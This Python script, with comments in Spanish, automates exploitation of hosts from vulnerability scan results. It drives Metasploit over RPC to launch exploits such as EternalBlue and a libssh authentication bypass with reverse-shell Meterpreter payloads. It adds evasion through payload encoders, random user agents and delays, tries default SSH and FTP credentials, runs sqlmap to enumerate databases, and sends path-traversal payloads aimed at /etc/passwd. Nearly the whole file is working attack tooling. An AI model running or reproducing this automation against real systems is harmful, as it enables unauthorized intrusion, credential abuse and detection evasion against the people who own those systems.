#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import json
import argparse
import subprocess
import logging
import random
import time
import yaml
import re
import base64
import requests
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from pymetasploit3.msfrpc import MsfRpcClient

# Configuración de logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('/opt/pentest/temp/exploit-dispatcher.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('exploit-dispatcher')

class ExploitDispatcher:
    def __init__(self, config_file='/opt/pentest/config/exploit-config.json'):
        """Inicializa el controlador de exploits con configuración desde archivo"""
        try:
            with open(config_file, 'r') as f:
                self.config = json.load(f)
        except FileNotFoundError:
            logger.error(f"Archivo de configuración no encontrado: {config_file}")
            # Configuración por defecto
            self.config = {
                "threads": 1,
                "timeout": 120,
                "msf_host": "127.0.0.1",
                "msf_port": 55553,
                "msf_user": "msf",
                "msf_pass": "msf",
                "user_agents": [
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
                    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)"
                ],
                "evasion_techniques": ["payload_encoding", "sleep_timers", "random_agent"],
                "exploit_intensity": "medium",
                "lhost": "127.0.0.1",
                "lport_range": [4000, 4500],
                "credentials": {
                    "default": [
                        {"username": "admin", "password": "admin"},
                        {"username": "root", "password": "toor"},
                        {"username": "admin", "password": "password"},
                        {"username": "administrator", "password": "administrator"}
                    ]
                }
            }
        
        # Comprobar si se está ejecutando metasploit RPC
        self.msf_client = None
        self.msf_initialized = False
        self.attempts_to_start_msf = 0
        self.max_attempts = 3
    
    def get_random_agent(self):
        """Devuelve un User-Agent aleatorio de la lista configurada"""
        return random.choice(self.config.get("user_agents", ["Mozilla/5.0"]))
    
    def get_next_available_port(self):
        """Obtiene el siguiente puerto disponible del rango configurado"""
        port_range = self.config.get("lport_range", [4000, 4500])
        return random.randint(port_range[0], port_range[1])
    
    def initialize_msf(self):
        """Inicializa la conexión con Metasploit Framework RPC"""
        if self.msf_initialized:
            return True
        
        if self.attempts_to_start_msf >= self.max_attempts:
            logger.error("Número máximo de intentos para iniciar MSF alcanzado")
            return False
        
        try:
            # Intentar conectar con el servicio RPC existente
            self.msf_client = MsfRpcClient(
                self.config.get("msf_pass", "msf"),
                server=self.config.get("msf_host", "127.0.0.1"),
                port=self.config.get("msf_port", 55553),
                ssl=False,
                username=self.config.get("msf_user", "msf")
            )
            
            # Verificar la conexión
            if self.msf_client and hasattr(self.msf_client, 'core'):
                msf_version = self.msf_client.core.version()
                logger.info(f"Conexión establecida con Metasploit Framework: {msf_version}")
                self.msf_initialized = True
                return True
            else:
                raise Exception("Conexión establecida pero API no accesible")
        
        except Exception as e:
            logger.warning(f"Error al conectar con Metasploit RPC: {str(e)}")
            logger.info(f"Intentando iniciar el servicio MSF RPC (intento {self.attempts_to_start_msf + 1})")
            
            # Iniciar el servicio MSF RPC
            try:
                cmd = [
                    "msfrpcd",
                    "-P", self.config.get("msf_pass", "msf"),
                    "-U", self.config.get("msf_user", "msf"),
                    "-a", self.config.get("msf_host", "127.0.0.1"),
                    "-p", str(self.config.get("msf_port", 55553)),
                    "-S", "false"
                ]
                
                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                time.sleep(10)  # Dar tiempo a que inicie
                
                self.attempts_to_start_msf += 1
                return self.initialize_msf()  # Intentar reconectar
            except Exception as e:
                logger.error(f"Error al iniciar servicio MSF RPC: {str(e)}")
                self.attempts_to_start_msf += 1
                return False
    
    def apply_msf_payload_evasion(self, payload):
        """Aplica técnicas de evasión al payload"""
        if not self.msf_initialized:
            return payload
        
        evasion_techniques = self.config.get("evasion_techniques", [])
        
        if "payload_encoding" in evasion_techniques:
            encoders = ["x86/shikata_ga_nai", "x86/fnstenv_mov", "x86/jmp_call_additive"]
            
            if "/x64/" in payload:
                encoders = ["x64/xor", "x64/xor_dynamic"]
            
            encoder = random.choice(encoders)
            iterations = random.randint(3, 10)
            
            return {
                "payload": payload,
                "encoder": encoder,
                "iterations": iterations,
                "format": "raw",
                "badchars": "\\x00\\x0a\\x0d"
            }
        
        return payload
    
    def run_msf_exploit(self, target, port, exploit_module, payload, options=None):
        """Ejecuta un exploit de Metasploit y retorna el resultado"""
        if not self.initialize_msf():
            logger.error("No se pudo inicializar Metasploit RPC")
            return {
                "success": False,
                "message": "Error al inicializar Metasploit RPC"
            }
        
        result = {
            "success": False,
            "message": "",
            "session_id": None,
            "session_type": None
        }
        
        try:
            # Crear la consola
            console_id = self.msf_client.consoles.console().get('id')
            
            # Configurar el exploit
            self.msf_client.consoles.console(console_id).write(f"use {exploit_module}\n")
            time.sleep(1)
            
            # Configurar opciones básicas
            self.msf_client.consoles.console(console_id).write(f"set RHOSTS {target}\n")
            time.sleep(0.5)
            self.msf_client.consoles.console(console_id).write(f"set RPORT {port}\n")
            time.sleep(0.5)
            
            # Configurar payload con evasión
            processed_payload = self.apply_msf_payload_evasion(payload)
            if isinstance(processed_payload, dict):
                self.msf_client.consoles.console(console_id).write(f"set PAYLOAD {processed_payload['payload']}\n")
                time.sleep(0.5)
                self.msf_client.consoles.console(console_id).write(f"set EnableStageEncoding true\n")
                time.sleep(0.5)
                self.msf_client.consoles.console(console_id).write(f"set StageEncoder {processed_payload['encoder']}\n")
                time.sleep(0.5)
                self.msf_client.consoles.console(console_id).write(f"set EnableStagerReturnAddressEncoding true\n")
                time.sleep(0.5)
                self.msf_client.consoles.console(console_id).write(f"set StageEncodingFallback false\n")
                time.sleep(0.5)
            else:
                self.msf_client.consoles.console(console_id).write(f"set PAYLOAD {processed_payload}\n")
                time.sleep(0.5)
            
            # Configurar opciones de listener
            lport = self.get_next_available_port()
            lhost = self.config.get("lhost", "127.0.0.1")
            
            self.msf_client.consoles.console(console_id).write(f"set LHOST {lhost}\n")
            time.sleep(0.5)
            self.msf_client.consoles.console(console_id).write(f"set LPORT {lport}\n")
            time.sleep(0.5)
            
            # Configurar opciones adicionales
            if options:
                for option, value in options.items():
                    self.msf_client.consoles.console(console_id).write(f"set {option} {value}\n")
                    time.sleep(0.5)
            
            # Aplicar técnicas de evasión adicionales
            evasion_techniques = self.config.get("evasion_techniques", [])
            if "sleep_timers" in evasion_techniques:
                self.msf_client.consoles.console(console_id).write(f"set WfsDelay {random.randint(2, 5)}\n")
                time.sleep(0.5)
            
            # Configurar verbosidad
            self.msf_client.consoles.console(console_id).write("set VERBOSE false\n")
            time.sleep(0.5)
            
            # Comprobar las opciones
            self.msf_client.consoles.console(console_id).write("show options\n")
            time.sleep(2)
            options_output = self.msf_client.consoles.console(console_id).read()
            
            # Ejecutar el exploit
            logger.info(f"Ejecutando exploit {exploit_module} contra {target}:{port}")
            self.msf_client.consoles.console(console_id).write("exploit -z\n")
            
            # Esperar a que termine el exploit
            timeout = self.config.get("timeout", 120)
            start_time = time.time()
            
            while time.time() - start_time < timeout:
                time.sleep(5)
                output = self.msf_client.consoles.console(console_id).read()
                
                # Verificar si hay nuevas sesiones
                sessions = self.msf_client.sessions.list
                if sessions:
                    for session_id, session_data in sessions.items():
                        if session_data['target_host'] == target:
                            result["success"] = True
                            result["message"] = f"Exploit exitoso: {exploit_module}"
                            result["session_id"] = session_id
                            result["session_type"] = session_data['type']
                            result["session_info"] = session_data
                            break
                
                # Si hay una sesión, salir del bucle
                if result["success"]:
                    break
                
                # Verificar si el exploit ha terminado
                if "Exploit completed" in output or "Exploit failed" in output:
                    break
            
            # Verificar resultado final
            if not result["success"]:
                # Leer la última salida por si hay errores
                final_output = self.msf_client.consoles.console(console_id).read()
                result["message"] = "Exploit fallido"
                result["error_details"] = final_output
            
            # Limpiar la consola
            self.msf_client.consoles.destroy(console_id)
        
        except Exception as e:
            logger.error(f"Error al ejecutar exploit MSF: {str(e)}")
            result["message"] = f"Error: {str(e)}"
        
        return result
    
    def exploit_web_vulnerability(self, target, port, vulnerability_info, is_ssl=False):
        """Explota una vulnerabilidad web"""
        protocol = "https" if is_ssl else "http"
        target_url = f"{protocol}://{target}:{port}"
        
        result = {
            "success": False,
            "message": "",
            "exploit_type": "web",
            "details": {}
        }
        
        vuln_name = vulnerability_info.get("name", "").lower()
        vuln_description = vulnerability_info.get("description", "").lower()
        vuln_matched = vulnerability_info.get("matched", "")
        vuln_tags = vulnerability_info.get("tags", [])
        
        try:
            # Determinar qué tipo de vulnerabilidad es y seleccionar método de explotación
            
            # 1. SQL Injection
            if "sql" in vuln_name or "sqli" in vuln_name or "sql injection" in vuln_description or "sqli" in vuln_tags:
                if self.config.get("exploit_intensity", "medium") != "low":
                    # Usar SQLMap para explotación automática
                    logger.info(f"Intentando explotar SQLi en {target_url}")
                    
                    # Construir comando SQLMap para explotación
                    url_to_exploit = vuln_matched if vuln_matched else target_url
                    cmd = [
                        "sqlmap",
                        "-u", url_to_exploit,
                        "--batch",
                        "--random-agent",
                        "--level", "3",
                        "--risk", "2",
                        "--technique", "BEUSTQ",
                        "--dbs",  # Enumerar bases de datos
                        "--threads", "2",
                        "--timeout", str(self.config.get("timeout", 120)),
                        "--output-dir", "/opt/pentest/temp/sqlmap"
                    ]
                    
                    logger.info(f"Ejecutando SQLMap: {' '.join(cmd)}")
                    
                    process = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
                    
                    if "available databases" in process.stdout:
                        result["success"] = True
                        result["message"] = "Explotación SQLi exitosa"
                        result["details"]["output"] = process.stdout
                        result["details"]["databases"] = []
                        
                        # Extraer bases de datos encontradas
                        db_match = re.search(r"available databases \[(.*?)\]", process.stdout)
                        if db_match:
                            dbs = db_match.group(1).split(", ")
                            result["details"]["databases"] = dbs
                    
            # 2. XSS (Cross-Site Scripting)
            elif "xss" in vuln_name or "cross-site scripting" in vuln_description or "xss" in vuln_tags:
                # Para XSS, generalmente solo se verifica, no se explota en un pentest ético
                result["success"] = True
                result["message"] = "XSS verificado (no explotado por razones éticas)"
                result["details"]["vulnerability"] = vulnerability_info
            
            # 3. Exploits conocidos con Metasploit
            elif "cve" in vuln_tags or "cve-" in vuln_name.lower():
                # Intentar encontrar un exploit de Metasploit para la vulnerabilidad
                cve_id = None
                
                # Buscar ID de CVE en la información
                cve_match = re.search(r"CVE-\d{4}-\d{4,}", vuln_name + " " + vuln_description)
                if cve_match:
                    cve_id = cve_match.group(0)
                
                if cve_id:
                    logger.info(f"Buscando exploits para {cve_id}")
                    
                    # Buscar exploits disponibles
                    cmd = ["searchsploit", "--json", cve_id]
                    process = subprocess.run(cmd, capture_output=True, text=True)
                    
                    try:
                        searchsploit_results = json.loads(process.stdout)
                        exploits = searchsploit_results.get("RESULTS_EXPLOIT", [])
                        
                        if exploits:
                            # Filtrar exploits de Metasploit
                            msf_exploits = [e for e in exploits if "/metasploit/" in e.get("Path", "").lower()]
                            
                            if msf_exploits and self.initialize_msf():
                                # Seleccionar un exploit y ejecutarlo
                                exploit = msf_exploits[0]
                                exploit_path = exploit.get("Path", "")
                                
                                # Extraer el path relativo del módulo MSF
                                msf_module = None
                                if "metasploit-framework/modules/" in exploit_path:
                                    msf_module = exploit_path.split("metasploit-framework/modules/")[1].replace(".rb", "")
                                
                                if msf_module:
                                    # Determinar payload según el tipo de servicio
                                    payload = "generic/shell_reverse_tcp"
                                    if "windows" in vuln_description.lower() or "microsoft" in vuln_description.lower():
                                        payload = "windows/meterpreter/reverse_tcp"
                                    elif "linux" in vuln_description.lower() or "unix" in vuln_description.lower():
                                        payload = "linux/x86/meterpreter/reverse_tcp"
                                    
                                    # Ejecutar el exploit
                                    exploit_result = self.run_msf_exploit(
                                        target, 
                                        port, 
                                        msf_module, 
                                        payload, 
                                        {"TARGETURI": "/"}
                                    )
                                    
                                    # Procesar resultado
                                    if exploit_result.get("success", False):
                                        result["success"] = True
                                        result["message"] = f"Exploit exitoso usando {msf_module}"
                                        result["details"] = exploit_result
                                    else:
                                        result["message"] = f"Exploit intentado pero falló: {msf_module}"
                                        result["details"]["msf_output"] = exploit_result.get("error_details", "")
                    except json.JSONDecodeError:
                        logger.warning(f"Error al parsear salida de searchsploit")
            
            # 4. File Inclusion (LFI/RFI)
            elif ("lfi" in vuln_name or "rfi" in vuln_name or 
                  "file inclusion" in vuln_description or 
                  "lfi" in vuln_tags or "rfi" in vuln_tags):
                
                if vuln_matched and ("?" in vuln_matched or "=" in vuln_matched):
                    logger.info(f"Verificando vulnerabilidad de File Inclusion en {vuln_matched}")
                    
                    # Lista de payloads para probar LFI
                    lfi_payloads = [
                        "/etc/passwd",
                        "../../../../etc/passwd",
                        "....//....//....//....//etc/passwd",
                        "../../../../../../../../etc/passwd",
                        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
                    ]
                    
                    for payload in lfi_payloads:
                        # Construir URL de prueba
                        test_url = vuln_matched
                        if "=" in vuln_matched:
                            param_name = vuln_matched.split("=")[0].split("?")[-1]
                            test_url = vuln_matched.replace(f"{param_name}=", f"{param_name}={payload}")
                        
                        # Realizar la petición
                        try:
                            headers = {"User-Agent": self.get_random_agent()}
                            response = requests.get(test_url, headers=headers, verify=False, timeout=10)
                            
                            # Verificar si la respuesta contiene contenido sensible
                            if "root:" in response.text and ":/bin/bash" in response.text:
                                result["success"] = True
                                result["message"] = "LFI confirmado"
                                result["details"]["payload_used"] = payload
                                result["details"]["proof"] = "Archivo /etc/passwd accesible"
                                break
                        except Exception as e:
                            logger.warning(f"Error al probar LFI: {str(e)}")
            
            # Si ninguna técnica específica funcionó, intentar con Nuclei para verificación adicional
            if not result["success"] and self.config.get("exploit_intensity", "medium") == "high":
                logger.info(f"Realizando verificación adicional con Nuclei en {target_url}")
                
                # Ejecutar Nuclei con plantillas de explotación
                cmd = [
                    "/root/go/bin/nuclei",
                    "-target", target_url,
                    "-t", "exploits",
                    "-severity", "critical,high",
                    "-json",
                    "-timeout", str(self.config.get("timeout", 120)),
                    "-silent"
                ]
                
                if "random_agent" in self.config.get("evasion_techniques", []):
                    cmd.extend(["-H", f"User-Agent: {self.get_random_agent()}"])
                
                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                
                for line in process.stdout:
                    if line.strip():
                        try:
                            finding = json.loads(line)
                            result["success"] = True
                            result["message"] = f"Vulnerabilidad explotable confirmada: {finding.get('info', {}).get('name', '')}"
                            result["details"]["nuclei_verification"] = finding
                            break
                        except json.JSONDecodeError:
                            continue
                
                process.wait()
        
        except Exception as e:
            logger.error(f"Error al explotar vulnerabilidad web: {str(e)}")
            result["message"] = f"Error durante la explotación: {str(e)}"
        
        return result
    
    def exploit_network_vulnerability(self, target, port, vulnerability_info, service_info):
        """Explota una vulnerabilidad de red"""
        service_name = service_info.get('service', '').lower()
        
        result = {
            "success": False,
            "message": "",
            "exploit_type": "network",
            "details": {}
        }
        
        vuln_name = vulnerability_info.get("name", "").lower()
        vuln_description = vulnerability_info.get("description", "").lower()
        vuln_tags = vulnerability_info.get("tags", [])
        
        try:
            # 1. Comprobar para credenciales por defecto
            if ("default credentials" in vuln_name or 
                "default password" in vuln_description or 
                "default_credentials" in vuln_tags):
                
                logger.info(f"Comprobando credenciales por defecto para {service_name} en {target}:{port}")
                
                # Obtener credenciales a probar
                credentials = self.config.get("credentials", {}).get("default", [])
                
                if service_name == "ssh":
                    # Probar credenciales SSH
                    for cred in credentials:
                        username = cred.get("username", "")
                        password = cred.get("password", "")
                        
                        if not username or not password:
                            continue
                        
                        cmd = [
                            "sshpass", 
                            "-p", password, 
                            "ssh", 
                            "-o", "StrictHostKeyChecking=no", 
                            "-o", "ConnectTimeout=10",
                            f"{username}@{target}",
                            "-p", str(port),
                            "id"
                        ]
                        
                        logger.debug(f"Probando SSH con {username}:{password}")
                        
                        process = subprocess.run(cmd, capture_output=True, text=True)
                        
                        if process.returncode == 0 and "uid=" in process.stdout:
                            result["success"] = True
                            result["message"] = f"Acceso SSH con credenciales: {username}:{password}"
                            result["details"]["credentials"] = {"username": username, "password": password}
                            result["details"]["command_output"] = process.stdout
                            break
                
                elif service_name in ["ftp", "vsftp"]:
                    # Probar credenciales FTP
                    for cred in credentials:
                        username = cred.get("username", "")
                        password = cred.get("password", "")
                        
                        if not username or not password:
                            continue
                        
                        try:
                            cmd = [
                                "ftp", 
                                "-n", 
                                "-v", 
                                target,
                                str(port)
                            ]
                            
                            ftp_commands = f"user {username} {password}\nls\nquit\n"
                            
                            logger.debug(f"Probando FTP con {username}:{password}")
                            
                            process = subprocess.run(cmd, input=ftp_commands.encode(), capture_output=True, text=True)
                            
                            if "Login successful" in process.stdout or "Directory listing" in process.stdout:
                                result["success"] = True
                                result["message"] = f"Acceso FTP con credenciales: {username}:{password}"
                                result["details"]["credentials"] = {"username": username, "password": password}
                                result["details"]["command_output"] = process.stdout
                                break
                        except Exception as e:
                            logger.warning(f"Error al probar FTP: {str(e)}")
            
            # 2. Buscar y ejecutar exploits de Metasploit para vulnerabilidades conocidas
            if not result["success"]:
                # Buscar CVE o identificadores de vulnerabilidad
                cve_id = None
                
                # Buscar ID de CVE en la información
                cve_match = re.search(r"CVE-\d{4}-\d{4,}", vuln_name + " " + vuln_description)
                if cve_match:
                    cve_id = cve_match.group(0)
                
                # Si hay un CVE, buscar exploits
                if cve_id:
                    logger.info(f"Buscando exploits para {cve_id}")
                    
                    # Buscar exploits disponibles
                    cmd = ["searchsploit", "--json", cve_id]
                    process = subprocess.run(cmd, capture_output=True, text=True)
                    
                    try:
                        searchsploit_results = json.loads(process.stdout)
                        exploits = searchsploit_results.get("RESULTS_EXPLOIT", [])
                        if exploits:
                            # Filtrar exploits de Metasploit
                            msf_exploits = [e for e in exploits if "/metasploit/" in e.get("Path", "").lower()]
                            
                            if msf_exploits and self.initialize_msf():
                                # Seleccionar un exploit y ejecutarlo
                                exploit = msf_exploits[0]
                                exploit_path = exploit.get("Path", "")
                                
                                # Extraer el path relativo del módulo MSF
                                msf_module = None
                                if "metasploit-framework/modules/" in exploit_path:
                                    msf_module = exploit_path.split("metasploit-framework/modules/")[1].replace(".rb", "")
                                
                                if msf_module:
                                    # Determinar payload según el tipo de servicio
                                    payload = "generic/shell_reverse_tcp"
                                    
                                    if "windows" in vuln_description.lower():
                                        payload = "windows/meterpreter/reverse_tcp"
                                    elif "linux" in vuln_description.lower() or "unix" in vuln_description.lower():
                                        payload = "linux/x86/meterpreter/reverse_tcp"
                                    
                                    # En caso de SSH
                                    if service_name == "ssh":
                                        payload = "cmd/unix/reverse_ssh"
                                    
                                    # Opciones adicionales específicas del servicio
                                    options = {}
                                    
                                    # Ejecutar el exploit
                                    exploit_result = self.run_msf_exploit(
                                        target, 
                                        port, 
                                        msf_module, 
                                        payload, 
                                        options
                                    )
                                    
                                    # Procesar resultado
                                    if exploit_result.get("success", False):
                                        result["success"] = True
                                        result["message"] = f"Exploit exitoso usando {msf_module}"
                                        result["details"] = exploit_result
                                    else:
                                        result["message"] = f"Exploit intentado pero falló: {msf_module}"
                                        result["details"]["msf_output"] = exploit_result.get("error_details", "")
                    except json.JSONDecodeError:
                        logger.warning(f"Error al parsear salida de searchsploit")
            
            # 3. En base al nombre del servicio, usar exploits específicos
            if not result["success"] and self.config.get("exploit_intensity", "medium") == "high":
                if service_name == "smb" or service_name in ["microsoft-ds", "netbios-ssn"] or port in [139, 445]:
                    # Probar exploit EternalBlue (MS17-010) para SMB
                    logger.info(f"Probando exploits específicos para SMB en {target}:{port}")
                    
                    # Verificar vulnerabilidad con auxiliar
                    if self.initialize_msf():
                        # Primero verificar con módulo auxiliar
                        console_id = self.msf_client.consoles.console().get('id')
                        self.msf_client.consoles.console(console_id).write("use auxiliary/scanner/smb/smb_ms17_010\n")
                        time.sleep(0.5)
                        self.msf_client.consoles.console(console_id).write(f"set RHOSTS {target}\n")
                        time.sleep(0.5)
                        self.msf_client.consoles.console(console_id).write("run\n")
                        time.sleep(5)
                        
                        output = self.msf_client.consoles.console(console_id).read()
                        self.msf_client.consoles.destroy(console_id)
                        
                        if "is likely VULNERABLE to MS17-010" in output:
                            # Ejecutar exploit
                            msf_module = "exploit/windows/smb/ms17_010_eternalblue"
                            payload = "windows/x64/meterpreter/reverse_tcp"
                            
                            exploit_result = self.run_msf_exploit(
                                target, 
                                port, 
                                msf_module, 
                                payload
                            )
                            
                            if exploit_result.get("success", False):
                                result["success"] = True
                                result["message"] = "Exploit MS17-010 (EternalBlue) exitoso"
                                result["details"] = exploit_result
                
                elif service_name in ["ssh"]:
                    # Intentar exploits SSH conocidos (libssh)
                    logger.info(f"Probando exploits específicos para SSH en {target}:{port}")
                    
                    if self.initialize_msf():
                        msf_module = "auxiliary/scanner/ssh/libssh_auth_bypass"
                        
                        console_id = self.msf_client.consoles.console().get('id')
                        self.msf_client.consoles.console(console_id).write(f"use {msf_module}\n")
                        time.sleep(0.5)
                        self.msf_client.consoles.console(console_id).write(f"set RHOSTS {target}\n")
                        time.sleep(0.5)
                        self.msf_client.consoles.console(console_id).write(f"set RPORT {port}\n")
                        time.sleep(0.5)
                        self.msf_client.consoles.console(console_id).write("run\n")
                        time.sleep(5)
                        
                        output = self.msf_client.consoles.console(console_id).read()
                        self.msf_client.consoles.destroy(console_id)
                        
                        if "Success: No authentication needed" in output:
                            # Ejecutar comando remoto
                            cmd = ["ssh", "-o", "StrictHostKeyChecking=no", "-p", str(port), f"a@{target}", "id"]
                            
                            process = subprocess.run(cmd, capture_output=True, text=True)
                            
                            if process.returncode == 0 and "uid=" in process.stdout:
                                result["success"] = True
                                result["message"] = "Vulnerabilidad de autenticación libssh explotada exitosamente"
                                result["details"]["command_output"] = process.stdout
        
        except Exception as e:
            logger.error(f"Error al explotar vulnerabilidad de red: {str(e)}")
            result["message"] = f"Error durante la explotación: {str(e)}"
        
        return result
    
    def prioritize_vulnerabilities(self, vulnerabilities):
        """Prioriza vulnerabilidades para explotación"""
        prioritized = []
        
        # Ordenar por severidad (critical > high > medium > low)
        severity_order = {"critical": 4, "high": 3, "medium": 2, "low": 1, "info": 0, "unknown": 0}
        
        for vuln in vulnerabilities:
            # Asignar puntaje de prioridad
            severity = vuln.get("severity", "unknown").lower()
            base_score = severity_order.get(severity, 0)
            
            # Aumentar puntaje si tiene CVE o es explotable conocido
            vuln_name = vuln.get("name", "").lower()
            vuln_description = vuln.get("description", "").lower()
            vuln_tags = vuln.get("tags", [])
            
            exploit_score = 0
            
            if "cve" in vuln_tags or "cve-" in vuln_name:
                exploit_score += 2
            
            if "exploit" in vuln_tags or "rce" in vuln_tags:
                exploit_score += 3
            
            if "metasploit" in vuln_tags or "msf" in vuln_tags:
                exploit_score += 2
            
            if "default_credentials" in vuln_tags or "default credentials" in vuln_name:
                exploit_score += 1
            
            # Aumentar para sqli, rfi, lfi
            if any(x in vuln_name.lower() + " " + vuln_description.lower() for x in 
                   ["sql injection", "sqli", "rfi", "lfi", "file inclusion", "rce", "remote code execution"]):
                exploit_score += 2
            
            # Puntaje final
            final_score = base_score * 10 + exploit_score
            
            prioritized.append({
                "vulnerability": vuln,
                "priority_score": final_score
            })
        
        # Ordenar por puntaje de prioridad (descendente)
        prioritized.sort(key=lambda x: x["priority_score"], reverse=True)
        
        return prioritized
    
    def exploit_vulnerability(self, target, port, vulnerability, service_info, is_web=False):
        """Explota una vulnerabilidad específica"""
        logger.info(f"Intentando explotar: {vulnerability.get('name', '')} en {target}:{port}")
        
        if is_web:
            return self.exploit_web_vulnerability(target, port, vulnerability, 
                                                 "https" in service_info.get("service", "").lower() or port == 443)
        else:
            return self.exploit_network_vulnerability(target, port, vulnerability, service_info)
    
    def exploit_target(self, target, vulnerabilities_data, service_data, output_file=None):
        """Explota vulnerabilidades en un objetivo"""
        start_time = datetime.now()
        logger.info(f"Iniciando explotación en {target} a las {start_time.strftime('%H:%M:%S')}")
        
        result = {
            'target': target,
            'timestamp': datetime.now().isoformat(),
            'exploitation_info': {
                'duration': None,
                'techniques_used': self.config.get("evasion_techniques", []),
                'intensity': self.config.get("exploit_intensity", "medium")
            },
            'exploits': [],
            'successful_exploits': 0
        }
        
        # Recolectar todas las vulnerabilidades de todos los puertos
        all_vulnerabilities = []
        
        for port, port_vuln_data in vulnerabilities_data.items():
            port = int(port)
            service_info = service_data.get(str(port), {})
            
            for vuln in port_vuln_data.get("vulnerabilities", []):
                all_vulnerabilities.append({
                    "port": port,
                    "vulnerability": vuln,
                    "service": service_info,
                    "is_web": port_vuln_data.get("scan_tool") == "web_vuln_scan"
                })
        
        # Priorizar vulnerabilidades
        prioritized_vulns = self.prioritize_vulnerabilities([v["vulnerability"] for v in all_vulnerabilities])
        
        # Crear mapeo para recuperar información original
        vuln_map = {}
        for vuln_data in all_vulnerabilities:
            vuln_key = json.dumps(vuln_data["vulnerability"])
            vuln_map[vuln_key] = vuln_data
        
        # Intentar explotar vulnerabilidades en orden de prioridad
        exploited_ports = set()
        max_exploits = 10  # Máximo número de exploits a intentar
        
        if self.config.get("exploit_intensity", "medium") == "low":
            max_exploits = 3
        elif self.config.get("exploit_intensity", "medium") == "high":
            max_exploits = 20
        
        for prioritized_vuln in prioritized_vulns:
            vuln = prioritized_vuln["vulnerability"]
            vuln_key = json.dumps(vuln)
            
            if vuln_key in vuln_map:
                vuln_data = vuln_map[vuln_key]
                port = vuln_data["port"]
                
                # Si ya hemos explotado con éxito este puerto y no estamos en modo intensivo, continuar
                if port in exploited_ports and self.config.get("exploit_intensity", "medium") != "high":
                    continue
                
                # Intentar explotar
                exploit_result = self.exploit_vulnerability(
                    target, 
                    port, 
                    vuln, 
                    vuln_data["service"], 
                    vuln_data["is_web"]
                )
                
                # Registrar resultado
                exploit_entry = {
                    "port": port,
                    "service": vuln_data["service"].get("service", "unknown"),
                    "vulnerability": vuln.get("name", ""),
                    "severity": vuln.get("severity", "unknown"),
                    "success": exploit_result.get("success", False),
                    "message": exploit_result.get("message", ""),
                    "details": exploit_result.get("details", {})
                }
                
                result["exploits"].append(exploit_entry)
                
                if exploit_result.get("success", False):
                    result["successful_exploits"] += 1
                    exploited_ports.add(port)
            
            # Limitar número máximo de exploits
            if len(result["exploits"]) >= max_exploits:
                logger.info(f"Alcanzado el máximo de {max_exploits} exploits a intentar")
                break
        
        # Calcular duración
        end_time = datetime.now()
        duration = (end_time - start_time).total_seconds()
        result['exploitation_info']['duration'] = duration
        logger.info(f"Explotación finalizada. Duración: {duration} segundos")
        
        # Guardar resultados
        if output_file:
            with open(output_file, 'w') as f:
                json.dump(result, f, indent=2)
            logger.info(f"Resultados guardados en {output_file}")
        
        return result

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Controlador de explotación automatizada con técnicas de evasión')
    parser.add_argument('-t', '--target', required=True, help='IP objetivo')
    parser.add_argument('-v', '--vulns', required=True, help='Archivo JSON con resultado del escaneo de vulnerabilidades')
    parser.add_argument('-s', '--services', required=True, help='Archivo JSON con información de servicios')
    parser.add_argument('-o', '--output', help='Archivo de salida para resultados JSON')
    parser.add_argument('-c', '--config', default='/opt/pentest/config/exploit-config.json', 
                        help='Archivo de configuración personalizado')
    parser.add_argument('--intensity', choices=['low', 'medium', 'high'], default='medium',
                        help='Intensidad de explotación (afecta número y agresividad de exploits)')
    
    args = parser.parse_args()
    
    # Cargar datos de vulnerabilidades desde archivo
    try:
        with open(args.vulns, 'r') as f:
            vuln_data = json.load(f)
            vulnerabilities = vuln_data.get('vulnerabilities', {})
    except Exception as e:
        logger.error(f"Error al cargar archivo de vulnerabilidades: {str(e)}")
        sys.exit(1)
    
    # Cargar datos de servicios desde archivo
    try:
        with open(args.services, 'r') as f:
            service_data = json.load(f)
            services = service_data.get('services', {})
    except Exception as e:
        logger.error(f"Error al cargar archivo de servicios: {str(e)}")
        sys.exit(1)
    
    # Crear directorio de salida si no existe
    if args.output:
        os.makedirs(os.path.dirname(os.path.abspath(args.output)), exist_ok=True)
    
    dispatcher = ExploitDispatcher(args.config)
    
    # Establecer intensidad desde línea de comandos si se especifica
    if args.intensity:
        dispatcher.config['exploit_intensity'] = args.intensity
    
    dispatcher.exploit_target(args.target, vulnerabilities, services, args.output)